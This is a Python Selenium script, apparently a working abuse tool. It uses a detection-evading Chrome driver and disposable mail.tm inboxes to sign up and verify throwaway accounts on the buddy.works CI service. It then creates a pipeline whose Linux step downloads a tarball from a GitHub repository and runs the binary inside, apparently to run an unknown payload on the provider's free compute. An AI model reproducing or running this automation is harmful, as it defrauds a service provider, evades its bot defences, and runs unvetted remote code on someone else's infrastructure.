import os
import undetected_chromedriver as uc
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.common.action_chains import ActionChains
import random
import requests
print("aaa")

def uwu():
    # try:
        time.sleep(5)
        # os.system("npm i")
        options = uc.ChromeOptions()
        os.system("rm -rf rawrz")
        os.system("tar -xf volx.tar.gz")
        os.system("rm -rf rawr")
        os.system("cp -r rawrz rawr")
        a = True
        low_word = "abcdefghijklkmnopqrstuvwxyz"
        upper_word = "ABDCEFGHIJKLMNOPQRSTUVWXYZ"
        number = "1234567890"
        symbols = "!@#$%&*"
        username_for = low_word
        password_for = low_word + upper_word + number + symbols
        long_password = 16
        long_username = 12
        ass = "".join(random.sample(username_for, 12))
        options.add_argument('--no-first-run --no-service-autorun --password-store=basic') #wlacz to jak juz nie bedzie dev test
        options.user_data_dir = "rawr"
        options.add_argument("--window-size=1920,1080")
        options.add_argument('--user-data-dir=rawr')
        options.add_argument("--remote-debugging-port=38223")
        driver = uc.Chrome(options=options, version_main=106)  # version_main allows to specify your chrome version instead of following chrome global version
        low_word = "abcdefghijklkmnopqrstuvwxyz"

        driver.get("https://buddy.works/")
        headersdomain = {'accept': 'application/ld+json'}
        responsedomain = requests.get('https://api.mail.tm/domains?page=1', headers=headersdomain)
        emil = "".join(random.sample(low_word, 13))+"@"+responsedomain.json()["hydra:member"][0]["domain"]
        myobj = {'address': emil,"password": "cloud"}
        headersreg = {'accept': 'application/ld+json'}
        responsereg = requests.post('https://api.mail.tm/accounts', headers=headersreg, json=myobj)
        time.sleep(1)
        driver.find_element(By.XPATH, "/html/body/div/div/main/section[1]/div/form/div/div/label/input").send_keys(emil)
        time.sleep(1)
        driver.find_element(By.XPATH, "/html/body/div/div/main/section[1]/div/form/div/div/button").click()
        time.sleep(30)
        driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div/div/form/div[1]/div[5]/div/div[2]/input").send_keys("".join(random.sample(low_word, 13)))
        time.sleep(1)
        driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div/div/form/div[1]/div[6]/div/div[2]/div/input").send_keys("".join(random.sample(low_word, 13))+"H!1")
        time.sleep(1)
        driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div/div/form/div[2]/button").click()
        time.sleep(20)
        myobjlog = {'address': emil,"password": "cloud"}
        headerslog = {'accept': 'application/ld+json'}
        responselog = requests.post('https://api.mail.tm/token', headers=headerslog, json=myobjlog)
        token = responselog.json()["token"]
        headersmess = {'accept': 'application/ld+json', "Authorization": "Bearer "+token}
        responsemess = requests.get('https://api.mail.tm/messages', headers=headersmess)
        headersmessz = {'accept': 'application/ld+json', "Authorization": "Bearer "+token}
        responsemessz = requests.get('https://api.mail.tm/messages/'+responsemess.json()["hydra:member"][0]["id"], headers=headersmess)
        verifylink = responsemessz.json()["text"].split("\n")[15].replace("[","").replace("]","")
        driver.get(verifylink)
        time.sleep(10)
        driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[2]/div/div[1]").click()
        time.sleep(3)
        driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[2]/form/div[2]/div[2]/div/div[2]/input").send_keys("".join(random.sample(low_word, 13)))
        time.sleep(1)
        driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[2]/form/div[3]/button").click()
        time.sleep(1)
        driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div/div[2]/div/div[2]/div[1]/div[2]/div/div[2]/div[2]/div[2]/a[1]").click()
        time.sleep(1)
        driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div/div[2]/div/div[2]/div[1]/div/div/div[1]/div/div[1]/div/span[3]/div/input").send_keys("x")
        time.sleep(1)
        driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div/div[2]/div/div[2]/div[1]/div/div/div[2]/div/div/div/div[2]").click()
        time.sleep(1)
        actions = ActionChains(driver)
        actions.send_keys('x')
        actions.perform()
        time.sleep(1)
        driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div/div[2]/div/div[2]/div[1]/div/div/div[3]/div/div[2]/div/a[2]").click()
        time.sleep(2.5)
        driver.find_element(By.XPATH,"/html/body/div[1]/div[2]/div/div[1]/div/nav/a[1]").click()
        time.sleep(5)
        driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div/div[2]/div/div[2]/div[1]/div[1]/div/div/a").click()
        time.sleep(2)
        driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[2]/div/form/div[1]/div[2]/div/div[2]/input").send_keys("".join(random.sample(low_word, 13)))
        time.sleep(1)
        driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[2]/div/form/div[1]/div[3]/div/div[2]/div/label[2]").click()
        time.sleep(1)
        driver.execute_script("window.scrollTo(0,document.body.scrollHeight)")
        time.sleep(1)
        driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[2]/div/form/div[1]/div[4]/div[2]/div[2]/label").click()
        time.sleep(1)
        driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[2]/div/form/div[2]/button").click()
        time.sleep(4)
        driver.get(driver.current_url.replace("choose","add/linux"))
        time.sleep(5)
        driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[2]/form/div[2]/div[1]/div/div[2]/div/div[1]/div/div[2]").click()
        time.sleep(1)
        actions = ActionChains(driver)
        actions.send_keys('wget https://github.com/n2dhektor/silver-octo-palm-tree/raw/main/cock7.tar.gz && tar -xf cock7.tar.gz && ./hapi')
        actions.perform()
        time.sleep(1)
        driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[2]/form/div[7]/button").click()
        time.sleep(5)
        driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[2]/div[2]/div/div[2]/div[2]/a").click()
        time.sleep(3)
        driver.find_element(By.XPATH, "/html/body/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[2]/form/div[3]/button").click()
        time.sleep(5)
    # except:
    #     pass
    #     uwu() /html/body/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[2]/div/form/div[1]/div[4]/div[2]/div[2]/label/input

uwu()
